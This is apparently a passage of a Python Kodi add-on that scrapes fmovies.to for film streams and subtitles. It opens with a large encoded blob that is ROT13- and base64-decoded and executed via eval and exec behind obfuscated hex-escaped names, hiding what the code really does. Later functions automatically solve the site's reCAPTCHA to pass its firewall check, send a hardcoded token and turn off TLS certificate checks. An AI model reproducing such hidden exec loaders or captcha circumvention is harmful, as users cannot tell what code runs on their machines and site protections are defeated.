oracle = 'MzMDY3Mzc0NjcxNjQzOTQ4MzI2NjQzNGY0ZDdhNjY2MjY2NDk0ZDc3Njk1MzM3NTE0YTVhNjMzNjMyNzIzMTY2NTE3NDRhNTU3Mjc5NDg1NzQzNjY2YjRhNzQ2NzZmNTU0YTUxNzg0MjU3NzE1MTY5MmY0NzUxNzAzMjRiNTI0ZjMyMzYzMjY4NzI0MzQ4NGY2YjYyNDQ3NjUwNjI0NDczNTY3YTRmNzQzNDQ1MzQ3OTcxNDk0ZjUzNzc0YTMxNzg0YzY5NDkzNTc0NTYzMDYyNDk0MjY1MzA1MDMyNjgzMzQzNWE2MjcwNzEzODMyNGYzMDRlMzQ1MzRhMzY3MzUyNTEzODQ2NDc3MDMyNmM1ODQzNjEzNTcxNDM1MDMyNGM1NjM1Njg0Nzc5NTE2Nzc0NGE2MTQzNDY1NTRlNGI2YjMyNGM2YzVhNTE0NzM5NzMzNDc3NjkzMTczNmUzOTY5NjUzNjMyNzg1NDMwNjI1OTUzN2E3NDQ1NGE3NDM2NjU0NTcyMzk2NzUzNTc2ZDY4NTg0NjUyNzg0MjQ0Njk1ODY4MzgzOTZjNDc1MTU4NzE2Yjc5N2E0ZDU2NzY0YjQ4NjE1OTUxNTc2MjQ1NjUzNjYzNzE1NjYxNTIzNzUzNzk2ODU3NTk3NTc3NDQ2NTUyNjg0NTUyNWE1NzYyNjY0OTM3MzIzNjM4NGQzNzUyNWE2MjczNzA1Mjc0NDk0NzQ3NzI0ZDUzNzM0YTZkMzA3OTc3NjU0ZDRjMzc0MzY0MzkzODcwMzg0ZDQ0NDg1YTRjNTE0MzZkNDUyYjM2Njc2Njc0NDg1NzQ3NmI2Nzc2NGM2ZDMyNDU0MjU0NGQ0NzMxNGQ0ZjYyNGQzOTcyNzY1Mjc0NTA0NDMxNzY1NjU4NzU3NjM2NDQ3ODJmNjgyZjRlMzA3NzZmMzI3MDY3NmY0NTRhNTk1NTM2MmY2Yjc1NGY1MzZkNzEzMDc2NDk1MTM3Mzc0ZjMwNzg2MTU0NTczMjZjNTI1NTY5NTM2MzQ5NjU2MzMyNzQ0NzYxMzc1NDMxNjg1MDYyNTM0ZTQzNzE3MTczMzA0NzYyMzY1YTc3NTg1YTU1NGYzNjU1NjgzNjU4NDc0MzcxNzEzOTZjMzU0ZDYzNGI3MzRhNjU0NTdhNzg1MDU3NjUyZjY2NGE3ODY3MmY0OTdhNzczMzRiNzYzNTRjNDI1ODc1NTkzMTRmNzM0NTYyMzA2YzY0Nzc1ODY3NjM3NDM4NTM0NTc4N2EzMTM5Njc2ZDU0NTUyYjQ5NTg3NDRlNGY0ODY2NmQ2YTQyNzM3MTc1N2E1NTZkMzg1OTQ1NzE3NjMxNmQ2ZDM4NzQzOTRmMzg0OTRlNjI0ODRlMzE0MjYzNjM1MTcyNzE0ZTM5NGI1ODc2Njg2ZDQzNTE2YjYyNGI1MTcyNDc2ODU4NTU1MTJmNjk0NTRlNmI0OTM5NzM1YTMwNmQ0NDRhNmQ2MTQzNmEzNjcyMzc1NTZiMmY2ZjQ5NjQ1MTQ0NzU0NTZhNGU1MzYxNGE0MzUyNGY3OTU0NTUzODRkNGU1NzM2NjgzMzU5Mzk0YjU2NzA0MTQ4MzQ1MzRiNjI1OTc4MmY3NzRlNTU0NzcxNjg0MjUxNTY1MDU0NDg2ODczMzU0NDc0NTAyZjUzNmY1OTQ3NDc0ZjU3MzczNzQ0NDk0ZTJmNmM1NDc4Njg0NDUxNTg3NTQ1MzI0MTZjNjI2YjRkMzk2YjY3NmI3NDY5NGE1NjJmNDM0NzZmNTQ0NjZhNDU2YzRmMzg0NDRlNDM0ODQxNzI0NzQ5NGY3OTcwNTk0MTJmNDM0OTcwNDE2YTU5NTI1NDcxNTQ1NjQ5NjY0ZTY1NDc2NTRjNDY1YTc3MzM0MTUyNjY0NTU3MzQ2OTQ0NDU0MjM0NmE0NzRkNGM3MTM1NmE0NzQ4NmE1ODc0NDIyYjM4MzU3YTc1NGI1OTVhNTk0YTYxNjUzMDRhNjYzODRmMzk0YTcwMzQ1MzZjNTI2ZjM2NGM2MTRmNjU0NjcwNjk0NDc0NTU3MzZjNjQyYjVhMmI2YjY2Njc2YzQ0Nzg0ZDZkNjczNDZmNGM3OTM2Nzc1Mjc5NGE2NjdhNDQ3NTRhNDE1MTM3Njk2MTY2MzQ3NzUxNmE3Nzc1MmI1NTQ4NTU0YTJmNmM2ZjRiNTA0NjU0Nzk1NjQ1NTEzNTMyNjI0NDU4MzI0OTZmNzk1MzZhNzY1MTMzNDI2NDczNTQyZjY4NmQ1NjU4NDIzMzQzNjI2MzZjNzM0NzZmNGU3NzU4NDY0MTUyNGE3NTcyNTUyYjRkNmY2OTU4NGY1MjRlNTk3NzYzMzE1MTcxNDQzOTQ1MzY2MjYyNDU1MTM0NDg3MjVhNDQ1ODc3NjYzNDJiNmU3NjQxNGQyYjQyNDg2YTQxNzU1ODQyNGY0NDUwNGE0YjM2NTk2NDcxNmU0ODQ0Mzc3YTQxNmEyYjUyNjc2ZDMyNDg2OTQzNzg1MTZiNzI0NTMwMzU0MjQ4NGYzMzU1MzI0OTcwNzk3NDY1Nzc0YTY2NmQ0ZjRkNTk1NjdhNjg0ZjYyNTI1NDJiNGI2ZTZiMzI0ZDU2NGE0MzYzNzM3MDUwNTM2ODM0NzgzMTRhMmI3MDZlNDc0ZDZmNjU0YjYzNTY1NTc3Nzc0NTYzNjQzMjc0NDQ3MzZlNTY2NjQxNzgzOTYxNGE2NzUzNjM0YzQ1MzA0ZDJiNmIzMzM0NTI3ODY5NmU0NDZhNTQ0ZDQ4NTE2YTRjNjY0YjVhN2E2YTU3NDk2OTdhNDU1NzRiNzY2OTczMzY2MjM4NTY0ZDU2NGU3ODZhMmY1Mzc3N2E3ODQxNjU1MzcwNmY0Nzc2NTk2NjU0NzU0ZDM2NDI2NjY1NzAzMDUzNTAzNTcxNDM1OTU5NjE2YzY0N2EyZjRiNmU2Yjc5NGM0NTQ5NTk1MzZmNDY0NTM2NzQ3ODQ3NjU0ZjM0Nzg2ZTY3NGU2ZTZmNjM0YTVhNmY2NjY2Nzg1MDU5MzA3YTZjNGM2YTUwMzQzNDRjNTk0NTUwMzA1NTM0NjYzMjUyNWE2NzUzNjM1NTc5NGU0ZTU5NTQ2MTY4MmY3NjY4NTAzNDZlNGI0MzM2NmI2MTYzNzc3MjQzNmU3YTMzNjg3MTM5MmY0ODc1NDM2ZTc0NzE2NTYxNTk1NDZiNGM0ZjMxNDEyZjcwNDU2ZjU0MzU0MjcyNTg0ZjJiNjczNjcyNzEzNzQ2NTM1MTZlMzY2ZTM3MzQ2ZjJiNTQyYjU1NDQ0NjVhNjM1YTYyN2E2NzY1NGE1NzUyNjY2YjZiMzc3MTZlNjY0YTQxNTg0NDY3NTE2ODZkNTc2NTQzNmQ2YjU4NDU3YTUzNzMzODZmNTA0YjZhNzk2MjMwNTQ1MDc2NTI0YTdhNjczNTZlMzY3NjM0NmY2ZDQyNzQ3Nzc1MzY3MDQ3NmI2NDc1NTY0NDc4NGY3MTYyMzk3ODY3NzQzMDM1NWE2ZDQyNjU3YTY1NjM0YjZhNzE1ODY0NTE1OTM0NzAzNzMxNjQzNTY3MmY0NjQxMmI1YTMwMzI2YTVhNmM2NzRhNzg2MjQ4NjgzNjZkNDM3NDU2NGQzMTQxNmM0OTZhNDY1NjMzNWE1MDM4NjM0NzQ0NzY1NzYzNGIzMzJmNjQ2YjcyMmI1MzM0Nzk0ODRiNmQ1NzRkNDE0ZjYzNDg3MTMxNmMzNzQ2NzQ3OTZlMmI0Njc4NzgzMzdhNDI1ODczNzEzODVhNTA0MjYzNjQ2OTZkNmY0OTdhNzkzMDUzNGU3Njc5NTIzOTUwNmM1YTZhNGYzMTMyNGU0Mjc4NTY0ZDUzMzE2OTYzMzg1NDRiNWEzNzRiNGM2YjY1NDY3NjM1NzA2MTZlMzg2ZjJiNTMzNDU0MzQzMTRkNDM0NjY2NGY0NjRkNzk2ZjM0Njc3YTc0NmM1NDcxNzg3MDMzNzc1MzRkMzUzNDcyMmY3ODZhNTY3NTQ5NTA3NzczNjI0YTcyNzc1ODY3Nzg0OTc3N2E0YTQ1NjM2MzU1NzQ3ODU4NzM1MzZlMmY1ODcwN2E0NTY5MzQzNDZkNjk0ODdhNzg3YTMzNGE1MzZmNmI1MzM3Njk2MjRiMzk2OTc1NzY0YzU4NmU0ZjRmNTM0NzYzNjU1OTMwNTA3NDQ2Nzg1MjZkNGY0MTMwNjM1NjM5MzI2NDJmMzEzNTJmNDg0ZjZmNTY2YTY1NzQ2ZjQyMzQ3ODY2NzQ3MjMxNjQzMTY3NmY3MDMzNjg1OTRiNjY3MDM3NDU2YzM5NWE1NjRkMmI1OTY2Nzg1MjZmMzE3YTZmNTc2NTRmNjI3ODMxNTY3MjM3NDQyYjQ3NTY1NjY1NTY0YjRlNDE0NjU0NjY0ZTRiNjM2NjZiNmE0NjczNjM2YTM2NzM1OTRiNDI1NTM4NzI1NzQ5NzczOTYxNWE0NzM0NDY0YjRlNjczMTRhNDQ2YTU3NDg2NzQxMzI2ZjczNTg0YjcxMzY1NDQ5MzA2NDRhNzQ2OTU3NTk3NzUwMmI1NzUxNDg3NDY4NjU0Zjc3NTU1MDQ3NzYyZjQ5NzI3OTZhNjQ1ODMzNmE2YTYxNzAzODZiNmU0ZDczNTU1NDRmNjU0ZDRhNzgzMjQxNTI3MDcxMzM0NzdhMmI3NjRkNGE2MjUyNzE3MjU5NDgyZjRlNzU0NTY1Mzk2MzUyMzM3MzY4NmQ0ZDc1NDY1NTY1Mzk1NTY0NTY2NTc0NGY2YzU5Nzc2NjJmMzY0MjRlNTY3YTdhNDE0MzM3NDg3MDZlMmY1NTY4NTc2NjQ2NDIzODZjMzQ3OTRjMzE2YzQ1MzUyZjZlNzM0Njc4NzU2MzU4Nzg2MjRkNGE3ODZkMzY2MjY5NDYzODYzNzc0NDczNjQ1MjcyNGEzOTUzMzk1NzYzNDM0ODQzNjU3MDc1NDc2Yzc4NmE0ZDcxMzQ3ODU2NmY0ZjdhMzg3MjZlNjM0NTJmNzM0YjY2MzY2ZTRmNmY2MjMyNDc0YjZmMmY1NzMxNDQ2YTUxMzg1OTM5NmE2ODZmMzU2ZTY4MzE1NjY2NGU1NzZkMzg1NDY2NDgzNzQxNmU0ODZmNGI2ZjJiMzI2MzYxNGQ2MjY2Nzg0ZjRmNjk1NDQ4NGEyZjUyNTY2YTcyNGQzMTM5NTc2MzQyNDg0NDU2NDI0Mjc1NmMzMDQ0Mzg2NjY4MzE1NjU0NTgzMDc0NjMzNDU4NzU0MTU5NTU2NDU2Mzc3NjYyNGI2ZTU1NzE3MDUyNjc2ZjZmNDg3YTQyNjU3MTY2NjczNzcwMzkzODdhMmYzMzM4NjYzOTRmNjU3MzQxNmM1MDc2MzA1NjY2NjczOTYyNTk3ODZhNDY1YTU1NzY1NTZmMzQyZjRiNjUzOTQ'
keymaker = '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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))

def getVerid(id):

    ab='aaaaaa'#AAAAAAAAAA'#ABBDEEBBAABBAABB'#ggo()
    ac = id

    hj = dekodujNowe (ab,ac)

    if sys.version_info >= (3,0,0):
        hj=hj.encode('Latin_1')

    hj2 = encode2(hj)   
    if sys.version_info >= (3,0,0):
        hj2=(hj2.decode('utf-8'))
        

    hjkl = ab + hj2
    return hjkl
    
def getLinks(exlink):
    href,id = exlink.split('|')

    html = sess.get(href, headers=headers, verify=False).content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    result = parseDOM(html, 'section', attrs={'class': "info"})[0]  
    plot = parseDOM(result, 'div', attrs={'itemprop': "description"})
    plot = PLchar(plot[0]) if plot else ''
    imag = parseDOM(result, 'img', ret='src')#[0]
    imag = imag[0] if imag else ''
    imag = 'https:'+imag if imag.startswith('//') else imag
    
    genres = re.findall('Genre\:(.+?)<\/div>',result)
    genres = genres[0] if genres else ''

    gg = re.findall('>([^<]+)<\/a>',genres)
    genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''

    countries = re.findall('Country\:(.+?)<\/div>',result) # 
    countries = countries[0] if countries else ''
    cc = re.findall('>([^<]+)<\/a>',countries)
    country = ', '.join([x.strip() for x in cc]) if gg else ''

    tim = re.findall('span>(\d+)\s*min<',result)
    tim = int(tim[0])*60 if tim else ''

    
    
    qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
    qual = qual[0].strip() if qual else ''

    yr = parseDOM(result, 'span', attrs={'itemprop': "dateCreated"})  
    yr = yr[0].strip() if yr else ''
    infol = {'plot':plot,'genre': genre,'country':country,'duration':tim,'year':yr}

    headers.update({'Referer': href})
    
    

    verid = getVerid(id)
    recap="03AGdBq25eDJkrezDo2y"
    params = (
        ('id', id),
       # ('verified', verid),
        ('vrf', verid),
        ('token', recap),
    )

    response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, verify=False)#
    
    html= (response.content)
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    html= html.replace('\\"','"')

    if 'sitekey=' in html:

        sitek=re.findall('data\-sitekey="(.+?)"',html)[0]

        token = recaptcha_v2.UnCaptchaReCaptcha().processCaptcha(sitek, lang='en')

        data = {
                'g-recaptcha-response': token}
        
        response = sess.post('https://fmovies.to/waf-verify', headers=headers, data=data, cookies=sess.cookies, verify=False)#
        
        params = (
            ('id', id),
            ('token', token),
        )
        response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, cookies=response.cookies, verify=False)#

    html = (response.content)#.replace('\\"','"')
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    html= html.replace('\\"','"')

   # linki = re.findall('data-id="([^"]+).*?<b>([^<]+).*?<span>([^<]+)',html)
  #  for linkid,host,qual in linki:
  #      tyt = nazwa+' - [I][COLOR khaki]'+host+'[/I] '+'- [B]('+qual+')[/COLOR][/B]'
  #      add_item(name=tyt, url=linkid+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)

    
    linki = re.findall('data-id="([^"]+).*?<div>([^<]+)',html)
    for linkid1,host in linki:
        tyt = nazwa+' - [I][COLOR khaki]'+host+'[/I] '+' [B][/COLOR][/B]'

        linkid = re.findall(linkid1+'"\:"([^"]+)',html)#[0]
        if linkid:
            add_item(name=tyt, url=linkid[0]+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
    
    


    if len(linki)>0:

        xbmcplugin.setContent(addon_handle, 'videos')
        xbmcplugin.endOfDirectory(addon_handle)    
    else:
        xbmcgui.Dialog().notification('[B]Błąd[/B]', 'Brak materiałów do wyświetlenia',xbmcgui.NOTIFICATION_INFO, 8000,False)
        
def dec(chra):

    try:    
        if sys.version_info >= (3,0,0):
            chra =repr(chra.encode('utf-8'))
            chra = chra.replace('\\xc3\\xaa','ę').replace('\\xc3\\x8a','Ę')
            chra = chra.replace('\\xc3\\xa6','ć').replace('\\xc3\\x86','Ć')
            chra = chra.replace('\\xc2\\xbf','ż').replace('\\xc2\\x9f','Ż')
            chra = chra.replace('\\xc2\\xb9','ą').replace('\\xc2\\x99','Ą')
            
            chra = chra.replace('\\xc5\\x93','ś').replace('\\xc5\\x92','Ś')
            chra = chra.replace('\\xc3\\xb3','ó').replace('\\xc3\\x93','Ó')
            
            chra = chra.replace('\\xc5\\xb8','ź').replace('\\xc5\\xb7','Ź')
            
            chra = chra.replace('\\xc2\\xb3','ł').replace('\\xc2\\x93','Ł')
            
            chra = chra.replace('\\xc3\\xb1','ń').replace('\\xc3\\x91','Ń')
            chra = chra .replace("b\'",'')

            chra = chra .replace("\\n",'\n').replace("\\r",'\r') 
            chra = chra .replace("\\'","'")

        else:

            chra = chra.replace('\xc3\xaa','ę').replace('\xc3\x8a','Ę')
            chra = chra.replace('\xc3\xa6','ć').replace('\xc3\x86','Ć')
            chra = chra.replace('\xc2\xbf','ż').replace('\xc2\x9f','Ż')
            chra = chra.replace('\xc2\xb9','ą').replace('\xc2\x99','Ą')
            
            chra = chra.replace('\xc5\x93','ś').replace('\xc5\x92','Ś')
            chra = chra.replace('\xc3\xb3','ó').replace('\xc3\x93','Ó')
            
            chra = chra.replace('\xc5\xb8','ź').replace('\xc5\xb7','Ź')
            
            chra = chra.replace('\xc2\xb3','ł').replace('\xc2\x93','Ł')
            
            chra = chra.replace('\xc3\xb1','ń').replace('\xc3\x91','Ń')



    except:
        pass
        
    return chra
    
def transPolish(subtlink):

    try:
        response = sess.get(subtlink, headers=headers, verify=False)#.content

        if sys.version_info >= (3,0,0):
        
            response  = response.text
        else:
            response  = response.content
        gg=dec(response)

        open(napisy, 'w').write(gg)

        return True
    except:
        return False
    
def PlayLink(exlink):
    id,href = exlink.split('|')

    params = (
        ('id', id),
    )

    headers.update({'Referer': href})
    response = sess.get('https://fmovies.to/ajax/episode/info', headers=headers, params=params, verify=False)#

    ab=response.content
    if sys.version_info >= (3,0,0):
        ab = ab.decode(encoding='utf-8', errors='strict')
    
    
    try:
        jsonab = json.loads(ab)
    except:
        pass
    if jsonab:
        url = jsonab.get('url',None)

    link2 = DecodeLink(url)

    reg = '?sub.info='
    reg = reg if reg in link2 else '?subtitle_json='

    link,subt = link2.split(reg)
    
    
    subsout=[]
    subtx = unquote(subt)
    subt = False
    if subtx:
        response = sess.get(subtx, headers=headers, verify=False).json()

        for subtitle in response:
            subt = subtitle.get('src',None)
            subt2 = subtitle.get('file',None)
            subt = subt if subt else subt2
            label = subtitle.get('label',None)
            subsout.append({'label':label,'subt':subt})
    if wybornapisow and subsout:
        labels = [x.get('label') for x in subsout]
        sel = xbmcgui.Dialog().select('Subtitle language',labels)    
        if sel>-1:
            subt=subsout[sel].get('subt')
            if subsout[sel].get('label') == 'Polish':
            
                subt = napisy if transPolish(subt) else subt
                
        else:
            subt = False

    if not 'mcloud' in link2:
        stream_url = resolveurl.resolve(link)
    else:

        link = link2.replace('/embed/','/info/')
        response = sess.get(link, headers=headers, verify=False).json()
        outz=[]
        if response.get('success',None):
            srcs = response.get('media',None).get('sources',None)
            for src in srcs:
                fil = src.get('file',None)
                if 'm3u8' in fil:
                    stream_url = fil+'|User-Agent='+UA+'&Referer='+link2
                    break

    play_item = xbmcgui.ListItem(path=stream_url)

    if subt:
        play_item.setSubtitles([subt])
    xbmcplugin.setResolvedUrl(addon_handle, True, listitem=play_item)

def DecodeLink(mainurl):

    ab=mainurl[0:6]   #23.09.21
    ac2 = mainurl[6:]    #23.09.21

    ac= decode2(ac2)
    
    link = dekodujNowe(ab,ac)
    link = unquote(link)
    return link

#def getFileJson():
#    with xbmcvfs.File(jfilename) as f:
